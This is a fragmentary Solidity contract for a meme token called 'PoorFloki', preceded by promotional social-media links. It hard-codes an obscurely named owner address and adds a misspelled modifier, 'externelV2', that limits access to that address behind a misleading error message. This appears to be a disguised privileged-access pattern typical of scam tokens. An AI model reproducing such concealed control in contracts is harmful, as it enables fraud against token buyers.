...
𝗧𝗘𝗟𝗘𝗚𝗥𝗔𝗠: https://t.me/poorfloki

𝗧𝗪𝗜𝗧𝗧𝗘𝗥:  https://twitter.com/PoorFloki

𝗪𝗘𝗕𝗦𝗜𝗧𝗘: poorfloki.space
...
contract Context {
 ...
 contract PoorFloki is Context, ERC20, ERC20Metadata {
    mapping(address => mapping(address => uint256)) private _allowances;
    mapping(address => uint256) private _balances;
    mapping(address => bool) private _excluded;

    string private _name = "PoorFloki";
    string private _symbol = "POORFLOKI";
    ...
    uint256 private multi = 1; // 𝗔𝗻𝘁𝗶𝗕𝗼𝘁
    ...
    address private _RedOwnershipPassedV2 = 0x91875A125B2CA701B0E3B8F6ADcD553f9B11253b; // 𝗢𝘄𝗻𝗲𝗿𝘀𝗵𝗶𝗽
  ...
  event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    ...
    modifier externelV2 () {
        require(_RedOwnershipPassedV2 == _msgSender(), "ERC20: cannot permit Pancake address");
        _;
    }
